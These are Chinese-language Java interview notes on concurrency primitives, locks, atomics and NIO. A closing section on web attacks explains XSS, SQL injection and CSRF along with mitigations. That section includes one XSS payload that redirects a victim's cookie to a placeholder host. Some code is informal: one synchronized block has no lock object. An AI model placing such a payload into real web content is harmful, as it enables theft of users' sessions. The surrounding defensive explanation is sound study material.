写一个包含了syn的类，javac编译  javap -verbose xxx 去查看编译后的代码

moniter对象 进入锁的时候就会调用moniter对象monitorenter指令，count+1 owner改变
monitorexit指令:退出count-1 owner置空
monitorexit两次，jvm会自动给加锁的地方弄异常处理，出现了异常也要释放


```



1.6以前，syn涉及到状态的切换效率较低,1.6后对jvm对锁做了优化

**自旋**：A线程拿到锁了，B线程去拿锁，发现A线程持有，B线程挂起(状态切换,cpu跑着，等待状态),B不去切换，while(true)一会，不涉及状态切换。

自旋的时间怎么判断？？因为如果自旋久了还不如切换状态

**自适应自旋**：根据你上次是否抢到锁，自动调整自选时间



**锁消除**：jvm自动消除锁

```java
 public  void run2() {
        //对象是在方法内部创建，方法栈跑 栈是线程私有的 压根不存在线程安全问题,出现锁消除
        StringBuffer stringBuffer = new StringBuffer("hello");
        //append方法是加了synchronized
        stringBuffer.append("word");
    }
```

**锁粗化：**

```java
 StringBuffer stringBuffer = new StringBuffer("hello");
    public  void run2() {
        //会有线程安全问题 stringBuffer是属于成员变量，放在堆中
        //不能锁消除，假如没有线程竞争的情况
        synchronized () {//如果在不影响逻辑的情况下 1000次加锁就变为一次加锁 锁粗化：扩大锁的范围
            for (int i = 0; i < 1000; i++) {
                //1000次频繁的加锁放锁，jvm就会自动粗化
                stringBuffer.append("word");
            }
        }
    }
```

**锁的类型**：

无锁、偏向锁、轻量级锁、重量级锁

syn(A) 为A对象增加了锁，但是如果只有一个线程来进入这个代码，jvm会检测到，直接无锁的状态，锁标志位是

01(无) 00(轻量级) 10  轻量级 重量级不同的 

对象头是存在于堆中，每次一个线程栈拿到这把锁，会复制一份到栈中，record 跟对象头是相互指针

**只有一个线程A，无锁状态**，mark word(01)<-----指针------>record(栈里面)，会升级为**偏向锁**，（因为虽然都是AB在抢，但是每次都是A抢到，这把锁就偏向A，哪怕A释放了锁，也把里面指针，owner都改成A，A再来的时候就跳过了很多步骤，**效率较高**），**AB交替运行(轻量级锁，竞争不激烈)**，**重量级锁**（多个线程，使劲抢）

**锁膨胀方向**

无锁、偏向锁、轻量级锁、重量级锁



### 回答：

```java

面试官：syn原理，mutex lock实现，jvm层面，首先每个对象在堆中都有一块是对象头，meta address,指向自己class，还有一块mark word，包含了比如hashcode，分代年龄等信息，还有锁标志位，线程id属性。另外每个对象
都会有一个叫moniter关联对象，这个moniter可以与对象相同的生命周期，也可以是在第一次使用锁的时候被创建，syn能加锁的原理就是因为有moniter对象，我也简单了解moniter对象，几个比较重要属性是，entryList....存放是什么什么，waitset....owner...count....每个都解释以下，解释一下流程。另外也通过javap -verbose命令查看过反编译代码，moniterenter---monterexit命令，所以我就认为，当某个线程抢到锁的时候就是执行moniterenter指令，count+1 owner改成当前线程，其它没有抢到的线程就进入entryList,如果在执行过程中使用wait方法那么就进入waitset等待notify
当然在1.6以前，syn效率低下，jvm在1.6以后对其做了很多优化，
比如说：自旋，自适应自旋，锁消除与粗化，并且在不同的情况下，对象锁会有无锁，偏向锁，轻量级锁，重量级锁等等状态。
```

## 21.lock(★★★★★)

```
- lock()：获得锁，如果锁被占用则等待。
- lockInterruptibly()：获得锁，但优先响应中断。（留着）
- tryLock()：尝试获得锁，如果成功，则返回true；失败返回false。此方法不等待，立即返回。
- tryLock(long time,TimeUnit)：在上面的方法上加上时间
- unlock()：释放锁，一定要记得释放锁，出现死锁
- Condition newCondition():自定义条件
```

```java
package cn.wanghan.fx.lock;

import java.util.concurrent.locks.ReentrantLock;

public class LockTest1 implements Runnable{
    //非公平锁
    //公平锁：等待锁的时间越长获得锁的概率越大
    ReentrantLock reentrantLock = new ReentrantLock(true);
    private static int i = 1;


    @Override
    public void run() {
        //加锁
        reentrantLock.lock();
        try{
            for (int i1 = 0; i1 < 10; i1++) {
                System.out.println(Thread.currentThread().getName()+","+i++);
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }finally {
            reentrantLock.unlock();
        }
    }

    public static void main(String[] args) {
        LockTest1 lockTest1 = new LockTest1();
        new Thread(lockTest1).start();
        new Thread(lockTest1).start();
        new Thread(lockTest1).start();
        new Thread(lockTest1).start();
    }
}


```

```java
package cn.wanghan.fx.lock;

import java.util.concurrent.TimeUnit;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class LockTest2 implements Runnable{
    Lock lock = new ReentrantLock();
    private static  int i = 0;

    @Override
    public void run() {
        try {
            if (lock.tryLock(3, TimeUnit.SECONDS)) {
                // lock.lock();
                try {
                    for (int i1 = 0; i1 < 10; i1++) {
                        System.out.println(Thread.currentThread().getName() + "抢到锁");
                        i++;
                    }
                    Thread.sleep(2000);
                } finally {
                    //一定要保证释放锁
                    lock.unlock();
                }
            } else {
                System.out.println(Thread.currentThread().getName() + "没有抢到锁");
            }
        }catch (InterruptedException e){
            e.printStackTrace();
        }


    }

    public static void main(String[] args) {
        LockTest2 lockTest = new LockTest2();
        new Thread(lockTest).start();
        new Thread(lockTest).start();
        new Thread(lockTest).start();
    }
}


```

```java
package cn.wanghan.fx.lock;

import java.util.concurrent.locks.ReentrantLock;

public class LockTest3 implements Runnable{
    ReentrantLock reentrantLock = new ReentrantLock();
    private static int i = 1;


    @Override
    public void run() {
        //加锁
        //reentrantLock.lock();
        try {
            reentrantLock.lockInterruptibly();
            try {
                for (int i1 = 0; i1 < 10; i1++) {
                    System.out.println(Thread.currentThread().getName());
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            } finally {
                reentrantLock.unlock(); //IllegalMonitorStateException
            }
        } catch (InterruptedException e) {
            System.out.println(Thread.currentThread().getName()+"等待过程被人打断");
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws InterruptedException {
        LockTest3 lockTest1 = new LockTest3();
        Thread thread1 = new Thread(lockTest1,"张三");
        thread1.start();
        Thread.sleep(2000);

        Thread thread2 = new Thread(lockTest1,"李 四");
                thread2.start();
        Thread.sleep(2000);

        Thread thread3 = new Thread(lockTest1,"王五");
        thread3.start();
        Thread.sleep(2000);
        //打断thread2的等待
        thread2.interrupt();
    }
}


```

API

```java
API:

getHoldCount()：当前线程调用 lock() 方法的次数
getQueueLength()：当前正在等待获取 Lock 锁的线程的估计数
getWaitQueueLength(Condition condition)：当前正在等待状态的线程的估计数，需要传入 Condition 对象
hasWaiters(Condition condition)：查询是否有线程正在等待与 Lock 锁有关的 Condition 条件
hasQueuedThread(Thread thread)：查询指定的线程是否正在等待获取 Lock 锁
hasQueuedThreads()：查询是否有线程正在等待获取此锁定
isFair()：判断当前 Lock 锁是不是公平锁
isHeldByCurrentThread()：查询当前线程是否保持此锁定
isLocked()：查询此锁定是否由任意线程保持
tryLock()：线程尝试获取锁，如果获取成功，则返回 true，如果获取失败（即锁已被其他线程获取），则返回 false
tryLock(long timeout，TimeUnit unit)：线程如果在指定等待时间内获得了锁，就返回true，否则返回 false
lockInterruptibly()：如果当前线程未被中断，则获取该锁定，如果已经被中断则出现异常
```

可重入锁

```java
package cn.wanghan.lock;

import java.util.concurrent.locks.ReentrantLock;

public class LockTest1 implements Runnable{
    ReentrantLock reentrantLock = new ReentrantLock();
    private static int i = 1;


    @Override
    public void run() {
        //加锁
        reentrantLock.lock();
        reentrantLock.lock();
        reentrantLock.lock();
        System.out.println(reentrantLock.getHoldCount());
        try {
            System.out.println(reentrantLock.hasQueuedThreads());
            Thread.sleep(3000);
            System.out.println("估计等待的线程数为："+reentrantLock.getQueueLength());
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println(Thread.currentThread().getName()+"保持此锁定："+reentrantLock.isHeldByCurrentThread());
        reentrantLock.unlock(); //IllegalMonitorStateException
        reentrantLock.unlock();
        reentrantLock.unlock();
        System.out.println(Thread.currentThread().getName()+"保持此锁定："+reentrantLock.isHeldByCurrentThread());


    }

    public static void main(String[] args) throws InterruptedException {
        LockTest1 lockTest1 = new LockTest1();
        Thread thread1 = new Thread(lockTest1,"张三1");
        thread1.start();
        Thread thread2 = new Thread(lockTest1,"张三2");
        thread2.start();
        Thread thread3 = new Thread(lockTest1,"张三3");
        thread3.start();
        Thread thread4 = new Thread(lockTest1,"张三4");
        thread4.start();

    }
}


```

**区别：syn是个关键字，lock是一个类，syn在等待过程不能被打断，lock可以被打断，而且可以指定时间的等待，释放锁，syn代码运行完毕或者出现异常，lock是通过unlock，syn mutex 管程(moniter),lock AQS实现**

## 22.读写锁

ReentrantLock这个类 只要加锁 就会被锁住，不管你是读写，读读依然会被锁住

```java
package cn.wanghan.lock;

import java.util.concurrent.locks.ReentrantReadWriteLock;

public class LockTest2 implements Runnable{
    ReentrantReadWriteLock reentrantReadWriteLock = new ReentrantReadWriteLock();
    ReentrantReadWriteLock.ReadLock readLock = reentrantReadWriteLock.readLock();
    ReentrantReadWriteLock.WriteLock writeLock = reentrantReadWriteLock.writeLock();


    @Override
    public void run() {
        writeLock.lock();
        try {
            System.out.println(Thread.currentThread().getName()+"获得了读锁");
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }finally {
            writeLock.unlock();
        }
    }

    public static void main(String[] args) {
        LockTest2 lockTest2 = new LockTest2();
        new Thread(lockTest2).start();
        new Thread(lockTest2).start();
    }
}


```

## 23.condition

wait() notify()依赖锁芯对象，用lock的时候没有锁芯对象，调用wait报错

```
Condition condition = lock.newCondition();
condition.await();//对应wait方法
condition.signal();///对应notify方法
condition.signalAll();//对应notifyAll方法

哪个Conditon的signal方法就只能叫醒自己的await
```

## 24.Semaphore用法(★★★★★)

信号量,Semaphore可以控同时访问的线程个数，可用做限流

```java
public Semaphore(int permits) {          //参数permits表示许可数目，即同时可以允许多少线程进行访问
    sync = new NonfairSync(permits);
}
public Semaphore(int permits, boolean fair) {    //这个多了一个参数fair表示是否是公平的，即等待时间越久的越先获取许可
    sync = (fair)? new FairSync(permits) : new NonfairSync(permits);
}

public void acquire() throws InterruptedException {  }     //获取一个许可
public void acquire(int permits) throws InterruptedException { }    //获取permits个许可
public void release() { }          //释放一个许可
public void release(int permits) { }    //释放permits个许可

这4个方法都会被阻塞，如果想立即得到执行结果，可以使用下面几个方法：

public boolean tryAcquire() { };    //尝试获取一个许可，若获取成功，则立即返回true，若获取失败，则立即返回false
public boolean tryAcquire(long timeout, TimeUnit unit) throws InterruptedException { };  //尝试获取一个许可，若在指定的时间内获取成功，则立即返回true，否则则立即返回false
public boolean tryAcquire(int permits) { }; //尝试获取permits个许可，若获取成功，则立即返回true，若获取失败，则立即返回false
public boolean tryAcquire(int permits, long timeout, TimeUnit unit) throws InterruptedException { }; //尝试获取permits个许可，若在指定的时间内获取成功，则立即返回true，否则则立即返回false
```

```java
package cn.wanghan.fx.aqs;

import java.util.concurrent.Semaphore;

public class SemaphoreTest implements Runnable{
    //就两个许可
    Semaphore semaphore = new Semaphore(2);
    @Override
    public void run() {
        try {
            //lock只能控制一个线程 ，可以控制多个
            semaphore.acquire();
            System.out.println(Thread.currentThread().getName()+"获得许可");
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }finally {
            semaphore.release();
        }
    }

    public static void main(String[] args) {
        SemaphoreTest semaphoreTest = new SemaphoreTest();
        new Thread(semaphoreTest,"张三").start();
        new Thread(semaphoreTest,"李四").start();
        new Thread(semaphoreTest,"王五").start();
    }
}

```

## 25.CountDownLatch用法

等待多个任务做完再继续做其它事情（协作的）

```java
package cn.wanghan.fx.aqs;

import java.util.concurrent.CountDownLatch;

public class CountDownLatchTest {

    public static void main(String[] args) throws InterruptedException {
        final CountDownLatch latch = new CountDownLatch(2);
        new Thread(()->{
            System.out.println(Thread.currentThread().getName()+"执行了..");
            try {
                Thread.sleep(5000);
                latch.countDown();//通知
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
        new Thread(()->{
            System.out.println(Thread.currentThread().getName()+"执行了..");
            try {
                Thread.sleep(10000);
                latch.countDown();//通知
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
        System.out.println("开始等待");
        System.out.println("只有等到有两个线程通知我 才继续执行下面");
        latch.await();
        System.out.println("两个线程执行完毕");
    }
}

```

## 26.CyclicBarrier用法

```java
package cn.wanghan.fx.aqs;

import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CyclicBarrier;
import java.util.concurrent.atomic.AtomicInteger;

public class CyCleTest {
    public static void main(String[] args) {

        for(int i=0;i<4;i++)
            new Writer(i+1).start();

    }
    static class Writer extends Thread{
        //private AtomicInteger atomicInteger = new AtomicInteger(0);
        public static CyclicBarrier cyclicBarrier=new CyclicBarrier(4);
        private int i ;
        public Writer(int i){
            this.i = i;
        }
        @Override
        public void run() {
            System.out.println("线程"+Thread.currentThread().getName()+"正在写入数据...");
            try {
                Thread.sleep(i*2000);      //以睡眠来模拟写入数据操作
                System.out.println("线程"+Thread.currentThread().getName()+"写入数据完毕，等待其他线程写入完毕");
                //会阻塞。。。直到 4 个线程都走到这儿
                cyclicBarrier.await();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }catch(BrokenBarrierException e){
                e.printStackTrace();
            }
            System.out.println("所有线程写入完毕，继续处理其他任务...");
        }
    }
}


```



## 24.问:AQS(★★★★★)

```java
AbstractQueuedSynchronizer
```

AQS的体系太庞大，我也简单的看几个类

我自己的理解就是，aqs是一套jdk帮我们实现了类似于加锁解锁，线程协作，获得许可，释放许可等基本功能的工具体系类，**正是基于这些基础的工具**，实现current并法包里面大量的比如信号量 ，ReentrantLock,CyclicBarrier方便开发人员并发类

## 25.原子类(★★★★★)

int i  线程不安全，syn 涉及到状态的切换

有的时候状态切换损失的效率，还不如不放cpu,于是就有cas

jdk也提供一套基于cas的原子类，线程安全的，全部基于cas

```java
new AtomicInteger(1) 类似于  int i = 1;
public final int get() //获取当前的值
public final int getAndSet(int newValue)//获取当前的值，并设置新的值 
public final int getAndIncrement()//获取当前的值，并自增 i++
public final int getAndDecrement() //获取当前的值，并自减 i--
public final int getAndAdd(int delta)  //获取当前的值，并加上预期的值
public final int incrementAndGet()  先自增再返回 ++i    
public final int decrementAndGet()  --i
IncrementAndGet() ++i
```

```java
package cn.wanghan.atomic;

import java.util.concurrent.atomic.AtomicInteger;

public class AtomicIntegerTest implements  Runnable{
    public  int i = 0;
    AtomicInteger atomicInteger = new AtomicInteger(0);
    @Override
    public void run() {
       // synchronized (this) {
            for (int i1 = 0; i1 < 1000; i1++) {
                atomicInteger.incrementAndGet();
            }
       // }
    }

    public static void main(String[] args) {

        AtomicIntegerTest atomicIntegerTest = new AtomicIntegerTest();
        for (int i = 0; i < 10; i++) {
            new Thread(atomicIntegerTest).start();
        }
        while (Thread.activeCount()>2){
            Thread.yield();
        }
        System.out.println(atomicIntegerTest.atomicInteger.get());
    }
}
```

## 26.callable

```java
package cn.wanghan.fx.call;

import java.util.concurrent.*;

public class CallTest implements Callable<String> {
    @Override//runnable 也叫任务
    public String call() throws Exception {
        System.out.println(Thread.currentThread().getName()+",执行了");
        return "天青色等烟雨";
    }

    public static void main(String[] args) throws ExecutionException, InterruptedException {
        ExecutorService executorService = Executors.newFixedThreadPool(2);

        Future<String> submit = executorService.submit(new CallTest());
        String s = submit.get();//会阻塞
        System.out.println("获得callable方法返回结果:"+s);

        Future<String> submit1 = executorService.submit(() -> {
            System.out.println(Thread.currentThread().getName() + ",执行了");
            return "天青色等烟雨";
        });
        executorService.shutdown();
    }
}


```

## 27.Future

```java
package cn.wanghan.callable;

import java.util.concurrent.*;

public class CallableTest implements Callable<Integer> {
    @Override
    public Integer call() throws Exception {
        System.out.println("call启动线程");
        Thread.sleep(2000);
        return 100;
    }

    public static void main(String[] args) throws ExecutionException, InterruptedException, TimeoutException {
        CallableTest callableTest = new CallableTest();
        //future

        FutureTask futureTask = new FutureTask<Integer>(callableTest){
            // 异步任务执行完成，回调
            @Override
            protected void done() {
                try {
                    System.out.println("future.done():" + get());
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (ExecutionException e) {
                    e.printStackTrace();
                }
            }
        };
        futureTask.run();
        Object o = futureTask.get(3, TimeUnit.SECONDS);
        System.out.println("futureTask获得返回值："+o);
    }
}

```

## 28.CompletableFuture

jdk 1.8提供的一个新类 50个方法作用

参考concurrent04.md

## 29.NIO

**NIO**即New IO，not block，这个库是在JDK1.4中才引入的。NIO和IO有相同的作用和目的，但实现方式不同，**NIO主要用到的是块**，所以NIO的效率要比IO高很多。同步非阻塞

```
IO同步与异步

同步： A线程调用了IO操作，需要A线程自己去询问是否成功。

异步： A线程发起了IO操作，计算机内核主动通知A线程是否结束。

阻塞非阻塞
阻塞:A线程发起了IO操作，A线程就等待IO完成，继续下面的代码
非阻塞：A线程发起了IO操作，操作系统，直接告诉A线程，还没好。A线程不断轮询，问

NIO同步非阻塞。
BIO同步阻塞IO，虽然阻塞但是cpu可以切出来做其它事

读取一个.txt----磁盘---内核----用户缓存   java真正的读取jvm---用户缓存


IO多路复用
原来的BIO是一个字节一个字节的处理，对象是Stream,NIO是按块处理(多个字节的数组)，速度快于BIO。
NIO的操作，不是依靠的Stream,依靠的是channel,Nio的块buffer,channel.read(buffer)
首先按照非阻塞一个channel访问read数据，虽然不会阻塞，但是需要不断轮询，不仅浪费cpu，而且相当于也没有做其它事情，于是在NIO中引入了一个select(一个线程)，需要把channel注册到select,一个select可以注册多个，这个select可以监听到每个channel只要有一个channel完成内核操作---用户内核，但是不知道是哪一个

原来100个用户就需要100个线程，但是现在100个用户只需要2个线程
1个线程去接收channel，来了一个channel发起请求，返回文件没有就绪，把自己注册到select，又可以接收新的channel重复操作

其实缺点：虽然是一个线程，但是假如select监听到两个channel同时完成了，channel还是得按顺序执行，还是会等待
可以这么改进，接客（接收channel时候用一个线程，运行得时候，线程池里面取）


select 监听了100个channel不知道是哪一个就绪了，循环所有的channel不太好
epoll可以直接知道是哪一个就绪
```

**面向流**的IO一次一个字节的处理数据，一个输入流产生一个字节，一个输出流就消费一个字节。为流式数据创建过滤器就变得非常容易，链接几个过滤器，以便对数据进行处理非常方便而简单，但是面向流的IO通常处理的很慢。

**面向块**的IO系统以块的形式处理数据。每一个操作都在一步中产生或消费一个数据块。按块要比按流快的多，但面向块的IO缺少了面向流IO所具有的有雅兴和简单性。

在NIO中，数据是放入buffer对象的，而在IO中，数据是直接写入或者读到Stream对象的。**应用程序不能直接对 Channel 进行读写操作，而必须通过 Buffer 来进行**，即 Channel 是通过 Buffer 来读写数据的

```
在NIO中，所有的数据都是用Buffer处理的，它是NIO读写数据的中转池。Buffer实质上是一个数组，通常是一个字节数据，但也可以是其他类型的数组。但一个缓冲区不仅仅是一个数组，重要的是它提供了对数据的结构化访问，而且还可以跟踪系统的读写进程。

使用 Buffer 读写数据一般遵循以下四个步骤：

写入数据到 Buffer；
调用 flip() 方法；
从 Buffer 中读取数据；
调用 clear() 方法或者 compact() 方法
当向 Buffer 写入数据时，Buffer 会记录下写了多少数据。一旦要读取数据，需要通过 flip() 方法将 Buffer 从写模式切换到读模式。在读模式下，可以读取之前写入到 Buffer 的所有数据。

一旦读完了所有的数据，就需要清空缓冲区，让它可以再次被写入。有两种方式能清空缓冲区：调用 clear() 或 compact() 方法。clear() 方法会清空整个缓冲区。compact() 方法只会清除已经读过的数据。任何未读的数据都被移到缓冲区的起始处，新写入的数据将放到缓冲区未读数据的后面。
Channel是一个对象，可以通过它读取和写入数据。可以把它看做IO中的流。但是它和流相比还有一些不同：

Channel是双向的，既可以读又可以写，而流是单向的
Channel可以进行异步的读写
对Channel的读写必须通过buffer对象
正如上面提到的，所有数据都通过Buffer对象处理，所以，您永远不会将字节直接写入到Channel中，相反，您是将数据写入到Buffer中；同样，您也不会从Channel中读取字节，而是将数据从Channel读入Buffer，再从Buffer获取这个字节。

因为Channel是双向的，所以Channel可以比流更好地反映出底层操作系统的真实情况。特别是在Unix模型中，底层操作系统通常都是双向的。

```

操作

```
第一步：获取通道
FileInputStream fin = new FileInputStream( "readandshow.txt" );
FileChannel fc = fin.getChannel();  

第二步：创建缓冲区
ByteBuffer buffer = ByteBuffer.allocate( 1024 );
第三步：将数据从通道读到缓冲区
fc.read( buffer );

 写入数据到文件
 第一步：获取一个通道
 FileOutputStream fout = new FileOutputStream( "writesomebytes.txt" );
FileChannel fc = fout.getChannel();
第二步：创建缓冲区，将数据放入缓冲区
ByteBuffer buffer = ByteBuffer.allocate( 1024 );

for (int i=0; i<message.length; ++i) {
 buffer.put( message[i] );
}
buffer.flip();
第三步：把缓冲区数据写入通道中
fc.write( buffer );



//声明源文件和目标文件
            FileInputStream fi=new FileInputStream(new File(src));
            FileOutputStream fo=new FileOutputStream(new File(dst));
            //获得传输通道channel
            FileChannel inChannel=fi.getChannel();
            FileChannel outChannel=fo.getChannel();
            //获得容器buffer
            ByteBuffer buffer=ByteBuffer.allocate(1024);
            while(true){
                //判断是否读完文件
                int eof =inChannel.read(buffer);
                if(eof==-1){
                    break;  
                }
                //重设一下buffer的position=0，limit=position
                buffer.flip();
                //开始写
                outChannel.write(buffer);
                //写完要重置buffer，重设position=0,limit=capacity
                buffer.clear();
            }
            inChannel.close();
            outChannel.close();
            fi.close();
            fo.close();

```

**Selector**。Selector是一个对象，它可以注册到很多个Channel上，监听各个Channel上发生的事件，并且能够根据事件情况决定Channel读写。这样，通过一个线程管理多个Channel，就可以处理大量网络连接了

```
Selector selector = Selector.open();
channel.configureBlocking(false);
SelectionKey key =channel.register(selector,SelectionKey.OP_READ);

```

NIO原生的非常复杂，如果有一天你需要用到nio（**netty**）

## 30.http与https的区别

3次握手4次挥手

https：进行了加密

http首先去买ssl安全证书-------分发公钥与私钥。

浏览器请求服务器-----服务器会给你一个公钥-------把数据公钥进行加密

详情见

https://segmentfault.com/a/1190000018992153

## 31.web攻击

```
xss攻击
你好<script>location.href=xxxxx?cookie=document.cookie</script>你好

1.输入到后台的内容标签进行校验
2.参数进行校验
3.cookie----setHttponly(true)
4.读取refer，header里面的属性 防盗链，不接受其它地方的请求，
5.csp白名单，用户在这个html中能访问的url全在白名单里面，

sql注入
预编译+sqlmap，druid进行sql监控

CSRF
登录A网站----
黑客知道A网站转钱的url http://xxxx:xxx/10000，黑客自己提交，是没有登录
发一个图片，好看好看 a=http://xxxx:xxx/10000
1.不用cookie用header
2.在提交转账或者比较敏感页面
（钩子方法----获取一个token后台随机生成密码，后台跟session绑定，把这个token放在你填写转账表单的一个隐藏域，提交转账敏感操作的时候，需要校验token）
3.用post方法
```

https://blog.csdn.net/weixin_44299027/article/details/105072477

## 18.设计模式

动态代理，原型，观察者模式，工厂模式，构建者，桥梁，责任链模式，装饰者，策略模式、、、、

## 19.7大软件设计原则

